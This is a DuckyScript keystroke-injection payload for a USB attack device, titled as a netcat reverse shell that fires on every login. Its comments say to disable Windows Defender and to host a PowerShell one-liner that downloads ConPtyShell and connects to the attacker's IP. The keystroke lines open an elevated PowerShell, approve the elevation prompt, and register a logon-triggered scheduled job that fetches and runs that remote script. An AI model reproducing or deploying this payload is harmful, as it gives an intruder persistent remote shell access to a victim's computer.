REM Title: Netcat Reverseshell On Log In
REM Description: Creates a powershell Job/Task to remotely connect to the computer with netcat every time user logs in
REM Author: https://github.com/HokkaidoInu
REM delay: You may want to change the delays and/or delete some, I have it like it is because I have really slow computer
REM setup: 
REM Windows defender is required to be disabled
REM Have IP and port 87 open and listening on server side for netcat reverse shell
REM Create a txt file with the command below in it, replacing the ip to your servers ip:
REM IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.10 87
REM Host the text file online on github or your own web server or something
REM Then in the payload, replace https://raw.githubusercontent.com/kalrizin/shellys-pers/refs/heads/main/rs.txt with the url that you are hosting your txt file in raw format
GUI r
DELAY 4000
STRING powershell
CTRL SHIFT ENTER
DELAY 4000
LEFT
DELAY 4000
ENTER
DELAY 4000
STRING $T = New-JobTrigger -AtLogOn ; $Script = Invoke-WebRequest 'https://raw.githubusercontent.com/kalrizin/shellys-pers/refs/heads/main/rs.txt' ; $ScriptBlock = [Scriptblock]::Create($Script.Content) ; Register-ScheduledJob -Name "Powershell" -ScriptBlock $ScriptBlock -Trigger $T
DELAY 4000
ENTER
DELAY 8000
STRING exit
DELAY 4000
ENTER
